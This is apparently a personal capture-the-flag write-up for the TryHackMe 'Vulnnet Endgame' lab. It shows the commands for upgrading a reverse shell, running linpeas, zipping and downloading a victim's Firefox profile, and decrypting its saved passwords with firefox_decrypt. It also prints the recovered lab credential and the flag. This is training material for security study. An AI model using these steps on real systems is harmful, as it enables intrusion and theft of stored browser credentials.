```

Hence you have to upgrade it.

Usually there's python installed on the box, which allows you to use 
python3 -c "__import__('pty').spawn('/bin/bash')" or similar.

stty -raw echo;fg 

Finally, type reset.

Input your TERM var (usually xterm-256color).
```
![[Pasted image 20231128141312.png]]

This mozilla logs sus to meeeeeee
![[Pasted image 20231128143232.png]]

Today i will make a payload (i.e. meter-preter shell rather than a reverse shell) cuz downloading and uploading is simply that way.

CheatSheets for meterperter
https://docs.rapid7.com/metasploit/manage-meterpreter-and-shell-sessions/

```
/root/TryHackMe/Vulnnet_Endgame/linpeas.sh
```
![[Pasted image 20231204133015.png]]

Finally able to run the linpeas.sh let's see what we can find 
![[Pasted image 20231204133103.png]]

We already know that's there is something suspicious about `.mozilla` folder
Everything else is standard here for a Gnome Desktop home directory.

![[Pasted image 20231204133804.png]]

```
cd .mozilla
ls -la 
du -a .
```
![[Pasted image 20231204133913.png]]

https://support.mozilla.org/en-US/kb/back-and-restore-information-firefox-profiles
https://github.com/unode/firefox_decrypt

```
download ~/home/system/.mozilla/firefox/profiles.ini
```
![[Pasted image 20231204134238.png]]

Run this command in the shell
```
cd /tmp && zip -r moz.zip /home/system/.mozilla
exit
```
![[Pasted image 20231204135100.png]]

```
exit
download /tmp/moz.zip
```
![[Pasted image 20231204135037.png]]

Atacker Machine
```
unzip moz.zip
```
![[Pasted image 20231204135233.png]]

Clone the repositary
```
https://github.com/unode/firefox_decrypt.git
```

```
./firefox_decrypt.py /root/TryHackMe/Vulnnet_Endgame/home/system/.mozilla/firefox
```
![[Pasted image 20231204140659.png]]

I have to see what's the path of the profiles 
![[Pasted image 20231204140948.png]]

```
./firefox_decrypt.py /root/TryHackMe/Vulnnet_Endgame/home/system/.mozilla/firefox/2fjnrwth.default-release
```
![[Pasted image 20231204140930.png]]

```
Website:   https://tryhackme.com
Username: 'chris_w@vulnnet.thm'
Password: '8y7TKQDpucKBYhwsb'
```
It's time for ssh now

I think to keep in mind is that we can't login with the given user but if recall that we have user name system when we got the rev shell so this are the little details we have to keep out eyes open for.
![[Pasted image 20231204141259.png]]

Now again the enumeration step will be the same and will try to get to the root but before that let's pwn the user.txt

![[Pasted image 20231204141505.png]]
```
THM{fb84e79072015186c72ec77ded49a5ff}
```
